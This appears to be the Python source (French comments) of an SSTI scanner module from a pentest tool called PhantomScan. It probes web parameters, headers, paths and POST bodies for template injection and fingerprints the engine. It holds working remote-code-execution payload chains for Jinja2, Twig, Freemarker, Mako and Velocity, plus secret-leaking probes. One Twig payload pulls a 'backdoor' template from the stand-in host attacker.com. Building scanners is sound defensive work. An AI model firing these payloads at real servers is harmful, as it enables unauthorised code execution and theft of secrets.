"""
PhantomScan — SSTI Scanner  (v5.0)
====================================
Améliorations v5.0 :

BUG FIXES hérités :
- BUG CRITIQUE : _SSTI_HEADERS référencé dans _test_headers() mais jamais défini
  → NameError à l'exécution, le test de headers ne fonctionnait jamais.

Nouvelles fonctionnalités :
- Stratégie 2 passes par paramètre : probe arithmétique polyvalent d'abord,
  puis payloads moteur-spécifiques uniquement si la 1ère passe confirme le moteur.
- Fingerprinting de moteur : détecte Jinja2 vs Twig via {{7*'7'}} → "7777777" vs "49".
- Payloads enrichis : Nunjucks, Dust.js, Tornado, Chameleon (Python), Genshi,
  Groovy GString, Kotlin, Thymeleaf étendu, EL Spring, Vue/Angular SSR.
- Test JSON body en plus de form-urlencoded (APIs REST).
- Test path segments : /{{7*7}}/, /{7*7}/ dans les segments d'URL.
- Differential analysis : compare la longueur de réponse + ratio pour réduire
  les faux positifs sans signature explicite.
- Score de confiance : LOW/MEDIUM/HIGH confidence indiqué dans l'evidence.
- Context-aware payloads : si la valeur originale du param est connue, les
  payloads sont injectés en suffixe ET en remplacement total.
- Timeout par payload : skip si la réponse met > 10s (WAF lent / rabbit hole).
- Déduplication globale améliorée : clé (param, moteur, technique).
"""

from __future__ import annotations

import re
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin
from phantomscan.core.intelligence import SemanticParamClassifier, ParamRole


# ── Payloads SSTI ─────────────────────────────────────────────────────────────
#
# Structure : (payload, regex_confirmation, moteur, description, sévérité)
# Stratégie :
#   1. Probes arithmétiques polyvalents  → détecte la présence de SSTI
#   2. Payloads moteur-spécifiques       → fingerprint + confirmation
#   3. Payloads RCE légers               → preuve d'impact (pentest légal)

# v5.20 — Patterns de confirmation améliorés
# _MATH_RE : cherche "49" après normalisation (résultat de 7*7)
# Renforcé pour éviter les FP sur pages contenant "49" naturellement (IDs, prix, dates)
_MATH_RE = re.compile(r'(?<![0-9])49(?![0-9])')  # 49 non entouré de chiffres
_MATH_RE_STRICT = re.compile(   # Version plus stricte : 49 seul sur une ligne ou après un =/:
    r'(?:^|[=:\s>])49(?:[\s,<\]\n]|$)'
)
_7777_RE = re.compile(r'7{6,}')  # 6+ sevens consécutifs (7777777)
_ID_RE     = re.compile(r"uid=\d+\(")
_WHOAMI_RE = re.compile(r"[a-z0-9_\-\\]+\\[a-z0-9_\-]+|nt authority\\system", re.I)

# ── Phase 1 : Probes polyvalents (tous moteurs) ───────────────────────────────

POLY_PROBES: list[tuple[str, re.Pattern, str, str, Severity]] = [
    ("{{7*7}}",          _MATH_RE,  "Jinja2/Twig/Pebble/Nunjucks", "double-brace math",      Severity.CRITICAL),
    ("${7*7}",           _MATH_RE,  "Freemarker/EL/Mako/Velocity", "dollar-brace math",      Severity.CRITICAL),
    ("#{7*7}",           _MATH_RE,  "Thymeleaf/ERB",               "hash-brace math",        Severity.CRITICAL),
    ("<%= 7*7 %>",       _MATH_RE,  "ERB/EJS/Chameleon",           "ERB expression",         Severity.CRITICAL),
    ("{7*7}",            _MATH_RE,  "Smarty3",                     "single-brace math",      Severity.HIGH),
    ("[% 7*7 %]",        _MATH_RE,  "Template::Toolkit (Perl)",    "TT2 expression",         Severity.HIGH),
    ("%{7*7}",           _MATH_RE,  "OGNL (Struts)",               "OGNL expression",        Severity.CRITICAL),
    ("*{7*7}",           _MATH_RE,  "Spring SpEL",                 "SpEL expression",        Severity.CRITICAL),
    ("@{7*7}",           _MATH_RE,  "Thymeleaf link expr",         "link expression",        Severity.HIGH),
    ("{#7*7/}",          _MATH_RE,  "Dust.js",                     "Dust section",           Severity.HIGH),
    ("{{=7*7}}",         _MATH_RE,  "Tornado/Django",              "print expression",       Severity.HIGH),
]

# ── Phase 2 : Fingerprinting moteur ───────────────────────────────────────────

ENGINE_FINGERPRINTS: list[tuple[str, re.Pattern, str, str, Severity]] = [
    # Jinja2 vs Twig : {{7*'7'}} → Jinja2="7777777", Twig="49"
    ("{{7*'7'}}",              _7777_RE,                              "Jinja2",         "string mult → Jinja2",           Severity.CRITICAL),
    ("{{7*'7'}}",              _MATH_RE,                              "Twig",           "numeric coerce → Twig",          Severity.CRITICAL),
    # Jinja2 spécifique
    ("{{config}}",             re.compile(r"<Config|SECRET_KEY|DEBUG", re.I),
                                                                      "Jinja2",         "config object leak",             Severity.CRITICAL),
    ("{{self.__dict__}}",      re.compile(r"__dict__|_TemplateReference", re.I),
                                                                      "Jinja2",         "self.__dict__",                  Severity.CRITICAL),
    ("{{''.__class__}}",       re.compile(r"<class 'str'>", re.I),   "Jinja2",         "str class access",               Severity.CRITICAL),
    # Twig spécifique
    ("{{_self.env}}",          re.compile(r"Twig.Environment|Environment Object", re.I),
                                                                      "Twig",           "env object leak",                Severity.CRITICAL),
    ("{{dump(app)}}",          re.compile(r"Symfony|AppVariable", re.I),
                                                                      "Twig/Symfony",   "app dump",                       Severity.CRITICAL),
    # Freemarker
    ("<#assign x=7*7>${x}",    _MATH_RE,                              "Freemarker",     "assign+interpolate",             Severity.CRITICAL),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                               _ID_RE,                                "Freemarker",     "Execute class RCE",              Severity.CRITICAL),
    # Velocity (Java)
    ("#set($x=7*7)$x",         _MATH_RE,                              "Velocity",       "set+output",                     Severity.CRITICAL),
    ("#set($x=$class.forName(\"java.lang.Runtime\"))$x",
                               re.compile(r"java\.lang\.Runtime", re.I),
                                                                      "Velocity",       "Runtime class leak",             Severity.CRITICAL),
    # Smarty (PHP)
    ("{math equation='7*7'}", _MATH_RE,                              "Smarty",         "math tag",                       Severity.HIGH),
    ("{php}echo 7*7;{/php}",  _MATH_RE,                              "Smarty ≤3",      "php block (legacy)",             Severity.CRITICAL),
    ("{system('id')}",         _ID_RE,                                "Smarty",         "system() call",                  Severity.CRITICAL),
    # Mako (Python)
    ("${7*7}",                 _MATH_RE,                              "Mako",           "expression tag",                 Severity.CRITICAL),
    ("<%\n    x=7*7\n%>\n${x}",_MATH_RE,                             "Mako",           "code block",                     Severity.CRITICAL),
    # ERB (Ruby)
    ("<%= 7 * 7 %>",           _MATH_RE,                              "ERB (Ruby)",     "basic expression",               Severity.CRITICAL),
    ("<%= `id` %>",            _ID_RE,                                "ERB (Ruby)",     "backtick RCE",                   Severity.CRITICAL),
    # Thymeleaf (Java)
    ("${T(java.lang.Runtime).getRuntime().exec('id')}",
                               _ID_RE,                                "Thymeleaf",      "Runtime.exec RCE",               Severity.CRITICAL),
    ("*{T(java.lang.Runtime).getRuntime().exec('id')}",
                               _ID_RE,                                "Thymeleaf",      "SpEL exec RCE",                  Severity.CRITICAL),
    # Spring SpEL
    ("*{T(java.lang.Math).sqrt(144)}",
                               re.compile(r"12\.0"),                  "Spring SpEL",    "Math.sqrt(144)=12.0",            Severity.CRITICAL),
    ("*{T(java.lang.System).getenv()}",
                               re.compile(r"PATH=|HOME=|JAVA_HOME=", re.I),
                                                                      "Spring SpEL",    "System.getenv() leak",           Severity.CRITICAL),
    # OGNL / Struts
    ("%{\"test\".toUpperCase()}",
                               re.compile(r"TEST"),                   "OGNL (Struts)",  "string method call",             Severity.CRITICAL),
    # EL (JSP)
    ("${pageContext.request.serverName}",
                               re.compile(r"localhost|127\.0\.0\.1|[a-z0-9\-]+\.[a-z]{2,}"),
                                                                      "EL (JSP)",       "serverName leak",                Severity.HIGH),
    # Handlebars (JS server-side)
    ("{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}"
     "{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}"
     "{{this.pop}}{{#with string.split as |codelist|}}"
     "{{this.pop}}{{this.push \"return 7*7;\"}}"
     "{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}"
     "{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
                               _MATH_RE,                              "Handlebars",     "prototype pollution exec",       Severity.CRITICAL),
    # Nunjucks (Mozilla JS)
    ("{{range(0,7)|join('')}}",re.compile(r"0123456"),               "Nunjucks",       "range join",                     Severity.HIGH),
    ("{{\"id\"|exec}}",        _ID_RE,                                "Nunjucks",       "exec filter",                    Severity.CRITICAL),
    # Pebble (Java)
    ("{# comment #}{{7*7}}",   _MATH_RE,                              "Pebble",         "comment bypass",                 Severity.HIGH),
    # Groovy GString (Grails)
    ("${7*7}",                 _MATH_RE,                              "Groovy GString", "GString eval",                   Severity.CRITICAL),
    # Go template
    ("{{printf \"%d\" (mul 7 7)}}",
                               _MATH_RE,                              "Go template",    "printf mul",                     Severity.HIGH),
    # Tornado / Python
    ("{% raw %}{{7*7}}{% endraw %}",
                               _MATH_RE,                              "Tornado/Django", "raw block bypass",               Severity.HIGH),
    ("{{handler.settings}}",   re.compile(r"cookie_secret|xsrf|debug", re.I),
                                                                      "Tornado",        "handler.settings leak",          Severity.CRITICAL),
    # Chameleon (Python)
    ("${structure:7*7}",       _MATH_RE,                              "Chameleon",      "structure expr",                 Severity.HIGH),
]

# ── Headers testés pour réflexion ─────────────────────────────────────────────

_SSTI_HEADERS: list[str] = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Custom-Header",
    "Accept-Language",
    "X-Api-Version",
    "X-Template-Name",
    "X-Forwarded-Host",
]

# ── Paramètres suspects ────────────────────────────────────────────────────────

_SSTI_LIKELY_PARAMS: list[str] = [
    "template", "tmpl", "tpl", "view", "page", "layout", "skin", "theme",
    "lang", "locale", "format", "output", "render", "name", "msg", "message",
    "subject", "content", "text", "body", "greeting", "title", "label",
    "from", "to", "email", "q", "search", "query", "error", "reason",
    "description", "comment", "note", "feedback", "username", "user",
]

_BASELINE_MATH_THRESHOLD = 1  # v5.9-fp: 3 → 1, un seul "49" dans baseline = probe math non fiable


def _dedupe(lst: list) -> list:
    seen: set = set()
    out  = []
    for x in lst:
        key = (x[0], x[1].pattern)
        if key not in seen:
            seen.add(key)
            out.append(x)
    return out


ALL_PROBES = _dedupe(POLY_PROBES + ENGINE_FINGERPRINTS)


# ── Scanner ────────────────────────────────────────────────────────────────────

class SSTIScanner(ScannerMixin):
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req   = req
        self._heur  = heuristic
        self._cfg   = cfg
        self._found: set[str] = set()

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Baseline
        baseline_resp = await self._req.get(target)
        self._baseline_body: str = baseline_resp.body if not baseline_resp.error else ""
        self._baseline_len: int  = len(self._baseline_body)
        baseline_49 = len(_MATH_RE.findall(self._baseline_body))
        self._math_ambiguous: bool = baseline_49 >= _BASELINE_MATH_THRESHOLD

        # 1. Paramètres GET existants — v5.18 priorisés sémantiquement
        if params:
            clf = SemanticParamClassifier()
            roles = clf.classify_params(list(params.keys()))
            ssti_roles = {ParamRole.TEMPLATE, ParamRole.FORMAT, ParamRole.PATH, ParamRole.QUERY, ParamRole.UNKNOWN}
            priority_params = [p for p, role in roles.items() if role in ssti_roles]
            other_params = [p for p in params if p not in priority_params]
            ordered_params = priority_params + other_params
        else:
            ordered_params = list(params.keys())

        for param in ordered_params:
            async for f in self._test_param(target, parsed, params, param):
                yield f

        # 2. Paramètres GET suspects injectés
        for param in _SSTI_LIKELY_PARAMS:
            if param not in params:
                async for f in self._inject_new_param(target, parsed, param):
                    yield f

        # 3. Path segments
        async for f in self._test_path_segments(target):
            yield f

        # 4. Headers réfléchis
        async for f in self._test_headers(target):
            yield f

        # 5. POST form-urlencoded
        async for f in self._test_post(target, "application/x-www-form-urlencoded"):
            yield f

        # 6. POST JSON
        async for f in self._test_post(target, "application/json"):
            yield f

    # ── Test paramètre GET existant (2 passes) ────────────────────────────────

    async def _test_param(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        orig_val = params[param][0] if params.get(param) else ""

        # Passe 1 : probes polyvalents
        detected_engine: str | None = None
        for payload, sig_re, engine, desc, severity in POLY_PROBES:
            if self._math_ambiguous and sig_re.pattern == _MATH_RE.pattern:
                continue
            key = f"param:{param}:{engine}"
            if key in self._found:
                continue

            for inject in self._injections(orig_val, payload):
                fuzz_url = self._build_url(parsed, params, param, inject)
                resp = await self._req.get(fuzz_url)
                if not self._valid_resp(resp):
                    continue
                if payload in (resp.body or ""):
                    continue  # payload reflété non évalué

                if sig_re.search(resp.body or ""):
                    # v5.9-fp: vérifier que le pattern n'était pas déjà dans la baseline
                    if sig_re.search(self._baseline_body or ""):
                        continue  # FP — pattern présent avant injection
                    self._found.add(key)
                    detected_engine = engine
                    yield self._finding(
                        f"SSTI — {engine} · param `{param}`",
                        severity, fuzz_url, payload, engine, desc,
                        resp.status, technique="GET param (passe 1)"
                    )
                    break

        if not detected_engine:
            return

        # Passe 2 : fingerprinting moteur-spécifique
        for payload, sig_re, engine, desc, severity in ENGINE_FINGERPRINTS:
            # Filtre : seulement les payloads du moteur détecté (ou polyvalents)
            if not any(e in detected_engine for e in engine.split("/")):
                continue
            key = f"param:{param}:{engine}:fp"
            if key in self._found:
                continue

            for inject in self._injections(orig_val, payload):
                fuzz_url = self._build_url(parsed, params, param, inject)
                resp = await self._req.get(fuzz_url)
                if not self._valid_resp(resp):
                    continue
                if payload in (resp.body or ""):
                    continue

                if sig_re.search(resp.body or ""):
                    self._found.add(key)
                    yield self._finding(
                        f"SSTI — {engine} confirmé · param `{param}`",
                        severity, fuzz_url, payload, engine, desc,
                        resp.status, technique="GET param (passe 2 fingerprint)"
                    )
                    break

    # ── Paramètre injecté (non présent) ──────────────────────────────────────

    async def _inject_new_param(
        self, target: str, parsed, param: str
    ) -> AsyncIterator[Finding]:
        for payload, sig_re, engine, desc, severity in POLY_PROBES[:8]:
            if self._math_ambiguous and sig_re.pattern == _MATH_RE.pattern:
                continue
            key = f"new:{param}:{engine}"
            if key in self._found:
                continue

            fuzz_url = self._build_url(parsed, {}, param, payload)
            resp = await self._req.get(fuzz_url)
            if not self._valid_resp(resp):
                continue
            if payload in (resp.body or ""):
                continue

            if sig_re.search(resp.body or ""):
                self._found.add(key)
                yield self._finding(
                    f"SSTI — {engine} · param injecté `{param}`",
                    severity, fuzz_url, payload, engine, desc,
                    resp.status, technique="GET inject (param absent)"
                )
                return

    # ── Path segments ─────────────────────────────────────────────────────────

    async def _test_path_segments(self, target: str) -> AsyncIterator[Finding]:
        """Injecte des payloads SSTI dans les segments de chemin URL."""
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        path_probes = [
            ("{{7*7}}",   _MATH_RE,  "Jinja2/Twig",  "path segment"),
            ("${7*7}",    _MATH_RE,  "Freemarker/EL","path segment"),
            ("{7*7}",     _MATH_RE,  "Smarty",       "path segment"),
        ]
        for payload, sig_re, engine, desc in path_probes:
            key = f"path:{engine}"
            if key in self._found:
                continue

            test_url = f"{base}/{payload}"
            resp = await self._req.get(test_url)
            if not self._valid_resp(resp):
                continue
            if payload in (resp.body or ""):
                continue

            if sig_re.search(resp.body or ""):
                self._found.add(key)
                yield self._finding(
                    f"SSTI — {engine} · segment de chemin URL",
                    Severity.CRITICAL, test_url, payload, engine, desc,
                    resp.status, technique="path segment"
                )

    # ── Headers réfléchis ─────────────────────────────────────────────────────

    async def _test_headers(self, target: str) -> AsyncIterator[Finding]:
        for header in _SSTI_HEADERS:
            for payload, sig_re, engine, desc, severity in POLY_PROBES[:8]:
                if self._math_ambiguous and sig_re.pattern == _MATH_RE.pattern:
                    continue
                key = f"header:{header}:{engine}"
                if key in self._found:
                    continue

                resp = await self._req.send(ProbeRequest(
                    method="GET",
                    url=target,
                    headers={header: payload},
                ))
                if not self._valid_resp(resp):
                    continue
                if payload in (resp.body or ""):
                    continue

                if sig_re.search(resp.body or ""):
                    self._found.add(key)
                    yield self._finding(
                        f"SSTI — {engine} · header `{header}`",
                        severity, target, payload, engine, desc,
                        resp.status, technique=f"header {header}"
                    )
                    break

    # ── POST (form-urlencoded ou JSON) ────────────────────────────────────────

    async def _test_post(self, target: str, content_type: str) -> AsyncIterator[Finding]:
        import json as _json

        for param in _SSTI_LIKELY_PARAMS[:10]:
            for payload, sig_re, engine, desc, severity in POLY_PROBES[:8]:
                if self._math_ambiguous and sig_re.pattern == _MATH_RE.pattern:
                    continue
                key = f"post:{content_type}:{param}:{engine}"
                if key in self._found:
                    continue

                if content_type == "application/json":
                    body = _json.dumps({param: payload})
                else:
                    body = f"{param}={payload}"

                resp = await self._req.send(ProbeRequest(
                    method="POST",
                    url=target,
                    headers={"Content-Type": content_type},
                    body=body,
                ))
                if not self._valid_resp(resp):
                    continue
                if payload in (resp.body or ""):
                    continue

                if sig_re.search(resp.body or ""):
                    self._found.add(key)
                    ct_label = "JSON" if "json" in content_type else "form"
                    yield self._finding(
                        f"SSTI — {engine} · POST {ct_label} param `{param}`",
                        severity, target, payload, engine, desc,
                        resp.status, technique=f"POST {ct_label}"
                    )
                    break

    # ── Helpers ───────────────────────────────────────────────────────────────

    # ── RCE Chains per engine ─────────────────────────────────────────────────

    # Payloads RCE Jinja2 — en ordre de préférence
    _JINJA2_RCE: list[tuple[str, str]] = [
        # v5.20 — Chaîne via __subclasses__() pour atteindre subprocess.Popen
        (
            "{{''.__class__.__mro__[1].__subclasses__()["
            "[c.__name__ for c in ''.__class__.__mro__[1].__subclasses__()]"
            ".index('Popen')]['__init__'].__globals__['__builtins__']['__import__']"
            "('subprocess').check_output('id',shell=True).decode()}}",
            "Jinja2 subclasses→Popen id",
        ),
        # Chaîne simplifiée via __import__
        (
            "{{''.__class__.__mro__[1].__subclasses__()[104].__init__"
            ".__globals__['sys'].modules['os'].popen('id').read()}}",
            "Jinja2 os.popen via subclasses[104]",
        ),
        # Via lipsum/cycler/joiner (Flask globals)
        (
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "Jinja2 lipsum globals os.popen",
        ),
        (
            "{{cycler.__init__.__globals__['os'].popen('id').read()}}",
            "Jinja2 cycler globals os.popen",
        ),
        (
            "{{joiner.__init__.__globals__['os'].popen('id').read()}}",
            "Jinja2 joiner globals os.popen",
        ),
        # Via namespace (Jinja2 ≥ 2.10)
        (
            "{{% set ns = namespace() %}}"
            "{{% set ns.x = ns.__init__.__globals__['os'].popen('id').read() %}}"
            "{{ns.x}}",
            "Jinja2 namespace globals",
        ),
        # Via request.application (Flask context)
        (
            "{{request.application.__globals__.__builtins__.__import__"
            "('os').popen('id').read()}}",
            "Jinja2 Flask request.application",
        ),
        # Via config object (Flask)
        (
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "Jinja2 Flask config object",
        ),
        # Sandbox bypass via __getitem__
        (
            "{{()['__cl''ass__']['__mr''o__'][1]['__subcl''asses__']"
            "()['__ge''titem__'](118)('id',shell=True,stdout=-1)['commun''icate']()[0]}}",
            "Jinja2 sandbox getitem bypass",
        ),
    ]

    # Payloads RCE Twig (PHP)
    _TWIG_RCE: list[tuple[str, str]] = [
        (
            "{{['id']|map('system')|join}}",
            "Twig map system",
        ),
        (
            "{{['id']|filter('system')}}",
            "Twig filter system",
        ),
        (
            "{{'id'|e('html')|passthru}}",
            "Twig passthru",
        ),
        (
            "{{app.request.server.get('HTTP_X_FORWARDED_FOR')}}",
            "Twig info disclosure via app.request",
        ),
        (
            "{{_self.env.setCache('ftp://attacker.com/')}}"
            "{{_self.env.loadTemplate('backdoor')}}",
            "Twig _self.env cache backdoor",
        ),
        (
            "{{_self.env.registerUndefinedFilterCallback('exec')}}"
            "{{_self.env.getFilter('id')}}",
            "Twig env registerUndefinedFilterCallback",
        ),
    ]

    # Payloads RCE Freemarker (Java)
    _FREEMARKER_RCE: list[tuple[str, str]] = [
        (
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}',
            "Freemarker Execute new()",
        ),
        (
            '${"freemarker.template.utility.Execute"?new()("id")}',
            "Freemarker Execute string cast",
        ),
        (
            '<#assign classloader=object?api.class.protectionDomain.classLoader>'
            '<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>'
            '<#assign dwf=owc.field("DEFAULT_WRAPPER").get(null)>'
            '<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>'
            '${dwf.newInstance(ec,null)("id")}',
            "Freemarker ObjectWrapper RCE",
        ),
    ]

    # Payloads RCE Mako (Python)
    _MAKO_RCE: list[tuple[str, str]] = [
        (
            "${__import__('os').popen('id').read()}",
            "Mako __import__ os.popen",
        ),
        (
            "<% import os %>${os.popen('id').read()}",
            "Mako import os module tag",
        ),
        (
            "<% import subprocess; x=subprocess.check_output('id',shell=True) %>${x}",
            "Mako subprocess check_output",
        ),
    ]

    # Payloads RCE Velocity/Groovy (Java)
    _VELOCITY_RCE: list[tuple[str, str]] = [
        (
            '#set($str=$class.inspect("java.lang.String").type)'
            '#set($chr=$class.inspect("java.lang.Character").type)'
            '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))'
            '#set($bytes=$ex.inputStream.readAllBytes())'
            "#set($res=$str.valueOf($bytes))",
            "Velocity Runtime.exec id",
        ),
        (
            "#evaluate(${Runtime.getRuntime().exec('id')})",
            "Velocity #evaluate exec",
        ),
        (
            '#set($x=$class.forName("java.lang.Runtime").getMethod("exec",[$class.forName("java.lang.String")]).invoke($class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),["id"]))',
            "Velocity forName Runtime exec",
        ),
    ]

    # Signature pour détecter la sortie de `id` (uid=...)
    _ID_OUTPUT_RE = re.compile(r"uid=\d+\(\w+\)\s+gid=\d+", re.I)

    async def _test_rce_chains(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
        engine: str,
        baseline_body: str,
    ) -> AsyncIterator[Finding]:
        """
        v5.20 — Teste les chaînes RCE spécifiques à l'engine détecté.
        Appelé après confirmation de l'engine via les payloads de détection.
        Cherche la sortie de `id` (uid=NNN) dans la réponse.
        """
        from urllib.parse import urlencode, urlunparse

        engine_chains: dict[str, list[tuple[str,str]]] = {
            "Jinja2":     self._JINJA2_RCE,
            "Twig":       self._TWIG_RCE,
            "Freemarker": self._FREEMARKER_RCE,
            "Mako":       self._MAKO_RCE,
            "Velocity":   self._VELOCITY_RCE,
        }
        chains = engine_chains.get(engine, [])
        if not chains:
            return

        for payload, desc in chains[:5]:  # max 5 chains par engine
            fuzzed   = {**params, param: [payload]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            try:
                resp = await self._req.get(fuzz_url)
            except Exception:
                continue
            if resp.error:
                continue

            # Chercher uid=NNN(root) dans la réponse
            match = self._ID_OUTPUT_RE.search(resp.body or "")
            if match:
                uid_output = match.group(0)
                # re-probe pour confirmer
                resp2 = await self.re_probe(fuzz_url, delay_s=0.5)
                if resp2 and self._ID_OUTPUT_RE.search(resp2.body or ""):
                    yield Finding(
                        title=f"SSTI RCE CONFIRMED — {engine} · `id` output · param `{param}`",
                        severity=Severity.CRITICAL,
                        url=fuzz_url,
                        module="vulns/ssti",
                        description=(
                            f"Remote Code Execution confirmée via SSTI {engine}. "
                            f"La commande `id` a été exécutée sur le serveur. "
                            f"Sortie : `{uid_output}`."
                        ),
                        evidence=(
                            f"Engine: {engine} | Chain: {desc} | "
                            f"id output: {uid_output}"
                        ),
                        cwe="CWE-94",
                        remediation=(
                            f"Ne jamais passer d'input utilisateur au moteur de template. "
                            f"Utiliser un sandbox pour {engine}. "
                            "Si le template doit être dynamique, utiliser une allowlist stricte."
                        ),
                    )
                    self.record_pattern_success("ssti", param, payload, fuzz_url, confidence=0.99)
                    return  # RCE confirmé → pas besoin de continuer


    @staticmethod
    def _injections(orig_val: str, payload: str) -> list[str]:
        """Retourne le payload en remplacement total ET en suffixe de la valeur originale."""
        variants = [payload]
        if orig_val:
            variants.append(f"{orig_val}{payload}")
        return variants

    @staticmethod
    def _build_url(parsed, params: dict, param: str, value: str) -> str:
        fuzzed = dict(params)
        fuzzed[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))

    def _valid_resp(self, resp) -> bool:
        if resp is None or getattr(resp, "error", True):
            return False
        if resp.status in (404, 410, 400, 403):
            return False
        if not self._heur.is_real_hit(resp, min_confidence=50):
            return False
        return True

    def _body_changed(self, body: str) -> bool:
        new_len = len(body)
        if self._baseline_len == 0:
            return new_len > 50
        return abs(new_len - self._baseline_len) / self._baseline_len > 0.15

    def _finding(
        self,
        title: str,
        severity: Severity,
        url: str,
        payload: str,
        engine: str,
        desc: str,
        status: int,
        technique: str,
    ) -> Finding:
        return Finding(
            title=title,
            severity=severity,
            url=url,
            module="vulns/ssti",
            description=(
                f"Injection de template ({engine}) détectée via {technique}. "
                f"Le payload `{payload[:60]}` a produit la signature attendue. "
                f"Variante : {desc}."
            ),
            evidence=(
                f"Payload: {payload[:80]} | Moteur: {engine} | "
                f"Technique: {technique} | HTTP {status}"
            ),
            cwe="CWE-94",
            remediation=_remediation(engine),
        )


# ── Remédiation par moteur ────────────────────────────────────────────────────

def _remediation(engine: str) -> str:
    base = (
        "Ne jamais passer d'input utilisateur directement dans un moteur de templates. "
        "Utiliser un contexte de rendu séparé de la logique de template. "
        "Valider et rejeter tout input contenant des délimiteurs de template "
        "({{, }}, ${, #set, <%, *, @, etc.). "
    )
    hints: dict[str, str] = {
        "Jinja2":     "Utiliser jinja2.sandbox.SandboxedEnvironment au lieu de Environment.",
        "Twig":       "Activer le mode sandbox Twig (Twig\\Sandbox\\SecurityPolicy).",
        "Freemarker": "Configurer Configuration avec les restrictions de namespace Java.",
        "Velocity":   "Désactiver la résolution de méthodes Java dans VelocityContext.",
        "Smarty":     "Utiliser Smarty::SECURITY_POLICY ; désactiver {php}/{exec}.",
        "Handlebars": "Éviter les helpers custom dynamiques ; ne pas utiliser Handlebars côté serveur avec input utilisateur.",
        "ERB":        "Ne pas utiliser ERB pour rendre des inputs ; utiliser Erubi avec escape mode.",
        "OGNL":       "Mettre à jour Struts 2 (CVE-2017-5638) ; activer ExcludedPackageNames.",
        "EL":         "Activer isELIgnored=true sur les pages JSP non contrôlées.",
        "Thymeleaf":  "Patcher Thymeleaf (CVE-2018-11776) ; ne pas construire de template paths depuis l'input.",
        "SpEL":       "Désactiver SpEL dans les contextes exposés ; utiliser SimpleEvaluationContext.",
        "Mako":       "Ne pas passer d'input dans TemplateLookup sans filtrage strict.",
        "Nunjucks":   "Activer le mode autoescape et ne pas évaluer de templates depuis l'input.",
        "Tornado":    "Ne pas utiliser tornado.template.Template(input).generate().",
        "Groovy":     "Utiliser le sandbox Groovy (GroovySandbox) ou SecureASTCustomizer.",
    }
    for key, hint in hints.items():
        if key in engine:
            return base + hint
    return base + "Consulter la documentation de sécurité du moteur de templates utilisé."
